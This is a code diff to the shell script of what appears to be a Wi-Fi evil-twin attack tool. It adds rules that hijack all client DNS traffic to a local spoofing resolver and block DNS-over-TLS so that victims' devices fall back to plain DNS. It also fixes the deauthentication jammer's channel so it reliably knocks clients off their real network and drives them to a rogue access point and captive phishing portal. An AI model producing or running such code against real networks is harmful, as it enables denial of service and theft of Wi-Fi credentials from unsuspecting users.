@@ -207,9 +207,10 @@ captive_portal_unset_ap_channel() {
 }
 
 # Lets the operator run the rogue access point on a different channel (and
-# band) than the target. The jammer always stays on the target's channel, so
-# clients can be deauthenticated on 5GHz while the evil twin is served on the
-# longer-range, less-regulated 2.4GHz band (or vice versa).
+# band) than the target. On a two-radio setup the jammer stays on the target's
+# channel while the evil twin is served on the longer-range, less-regulated
+# band (or vice versa); a single radio cannot do both, so the jammer follows
+# the AP's channel and a warning is printed.
 captive_portal_set_ap_channel() {
   if [ "$CaptivePortalAccessPointChannel" ]; then return 0; fi
 
@@ -1624,12 +1625,31 @@ captive_portal_set_routes() {
   iptables -A INPUT -p tcp --dport 443 -j ACCEPT
   iptables -A INPUT -p tcp --dport 80 -j ACCEPT
   iptables -A INPUT -p udp --dport 53 -j ACCEPT
+  iptables -A INPUT -p tcp --dport 53 -j ACCEPT
   iptables -A INPUT -p udp --dport 67 -j ACCEPT
 
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
     --to-destination $CaptivePortalGatewayAddress:80
   iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
     --to-destination $CaptivePortalGatewayAddress:443
+
+  # Force every client DNS query to the local resolver. A phone with a
+  # hard-coded DNS (or one that ignores the DHCP option) would otherwise never
+  # reach dnsspoof, so "captive.gateway.lan" would not resolve and the portal
+  # page would never load.
+  iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT \
+    --to-destination $CaptivePortalGatewayAddress:53
+  iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT \
+    --to-destination $CaptivePortalGatewayAddress:53
+
+  # DNS-over-TLS cannot be redirected without breaking the TLS session.
+  # Reject it quickly so the client falls back to plain DNS instead of
+  # deciding the network is dead.
+  iptables -A INPUT -p tcp --dport 853 -j REJECT
+  iptables -A INPUT -p udp --dport 853 -j REJECT
+  iptables -A FORWARD -p tcp --dport 853 -j REJECT
+  iptables -A FORWARD -p udp --dport 853 -j REJECT
+
   iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
@@ -1881,6 +1901,33 @@ captive_portal_start_jammer_service() {
   if [ "$currentMode" != "monitor" ]; then
     interface_set_mode "$CaptivePortalJammerInterface" monitor &>> $CAPCAPOutputDevice
     sleep 1
+  fi
+
+  # Monitor mode resets the radio to its default channel; aireplay-ng does not
+  # tune the interface, so the deauth would be transmitted on the wrong
+  # channel. The rogue AP may intentionally run on a different channel (which
+  # needs a second radio): in that case the AP's channel wins, because moving a
+  # shared phy would take the AP down with it.
+  local jammerChannel="$CapCapTargetChannel"
+  if [ "$CaptivePortalAccessPointInterface" ] && \
+     [ "$CaptivePortalAccessPointChannel" ] && \
+     [ "$CaptivePortalAccessPointChannel" != "$CapCapTargetChannel" ]; then
+    interface_physical "$CaptivePortalJammerInterface"
+    local jammerPhy="$InterfacePhysical"
+    interface_physical "$CaptivePortalAccessPointInterface"
+    local apPhy="$InterfacePhysical"
+    if [ "$jammerPhy" ] && [ "$jammerPhy" = "$apPhy" ]; then
+      jammerChannel="$CaptivePortalAccessPointChannel"
+      echo -e "$CAPCAPVLine $CaptivePortalSameRadioChannelWarning"
+    fi
+  fi
+  if [ "$jammerChannel" ]; then
+    if interface_set_channel \
+      "$CaptivePortalJammerInterface" "$jammerChannel"; then
+      echo "Jammer locked to channel $jammerChannel." >> $CAPCAPOutputDevice
+    else
+      echo -e "$CAPCAPVLine $CaptivePortalChannelSetWarning"
+    fi
   fi
 
   local targetClients=""
